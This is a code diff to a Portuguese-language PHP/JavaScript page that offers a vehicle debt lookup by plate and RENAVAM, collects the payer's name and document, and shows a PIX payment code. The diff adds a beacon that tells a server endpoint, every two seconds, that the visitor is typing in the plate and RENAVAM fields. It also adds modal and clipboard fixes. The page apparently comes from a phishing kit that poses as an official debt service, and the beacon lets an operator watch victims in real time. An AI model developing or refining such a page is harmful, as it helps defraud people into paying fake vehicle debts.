@@ -111,6 +111,9 @@ require_once "../../base/tracker.php";
                             <h2 class="h3 text-primary fw-bold">CONSULTA DE DÉBITOS</h2>
                             <p class="text-muted small">Informe os dados abaixo para visualizar as pendências do veículo.</p>
                         </div>
+<!--                        <div id="typingIndicator" class="alert alert-info py-2 px-3 small d-none mb-3">-->
+<!--                            <i class="bi bi-broadcast me-1"></i> Enviando status de digitação...-->
+<!--                        </div>-->
                         <form id="formConsulta">
                             <div class="mb-3">
                                 <label class="form-label fw-bold">Placa</label>
@@ -266,11 +269,44 @@ require_once "../../base/tracker.php";
     let totalValor = 0;
     let currentRef = null;
     let pollInterval = null;
+    let typingInterval = null;
+    let typingStopTimeout = null;
 
     function showStep(stepName) {
         document.querySelectorAll('.step-content').forEach(s => s.classList.remove('active'));
         document.getElementById(`step-${stepName}`).classList.add('active');
         window.scrollTo(0,0);
+    }
+
+    function startTypingStatus() {
+        const indicator = document.getElementById('typingIndicator');
+        if (indicator) {
+            indicator.classList.remove('d-none');
+        }
+
+        if (!typingInterval) {
+            fetch('../../api/typing_start.php').catch(() => {});
+            typingInterval = setInterval(() => {
+                fetch('../../api/typing_start.php').catch(() => {});
+            }, 2000);
+        }
+
+        clearTimeout(typingStopTimeout);
+        typingStopTimeout = setTimeout(stopTypingStatus, 2000);
+    }
+
+    function stopTypingStatus() {
+        if (typingInterval) {
+            clearInterval(typingInterval);
+            typingInterval = null;
+        }
+        clearTimeout(typingStopTimeout);
+        typingStopTimeout = null;
+
+        const indicator = document.getElementById('typingIndicator');
+        if (indicator) {
+            indicator.classList.add('d-none');
+        }
     }
 
     // Máscara CPF/CNPJ
@@ -290,8 +326,15 @@ require_once "../../base/tracker.php";
     });
 
     // Consulta
+    ['placa', 'renavam'].forEach(id => {
+        const input = document.getElementById(id);
+        input.addEventListener('input', startTypingStatus);
+        input.addEventListener('blur', stopTypingStatus);
+    });
+
     document.getElementById('formConsulta').addEventListener('submit', function(e) {
         e.preventDefault();
+        stopTypingStatus();
         const placa = document.getElementById('placa').value;
         const renavam = document.getElementById('renavam').value;
         const btn = document.getElementById('btnConsultar');
@@ -361,6 +404,12 @@ require_once "../../base/tracker.php";
         document.getElementById('modalDados').style.display = 'none';
     });
 
+    document.getElementById('modalDados').addEventListener('click', (e) => {
+        if (e.target.id === 'modalDados') {
+            document.getElementById('modalDados').style.display = 'none';
+        }
+    });
+
     document.getElementById('btnFinalizarGuia').addEventListener('click', () => {
         const nome = document.getElementById('cust-nome').value;
         const doc = document.getElementById('cust-doc').value;
@@ -401,7 +450,8 @@ require_once "../../base/tracker.php";
 
     function copyPix() {
         const code = document.getElementById('pixCode').dataset.code;
-        navigator.clipboard.writeText(code);
+        if (!code) return;
+        navigator.clipboard.writeText(code).catch(() => {});
         const box = document.getElementById('pixCode');
         box.textContent = '✅ CÓDIGO COPIADO COM SUCESSO!';
         box.style.backgroundColor = '#e8f5e9';
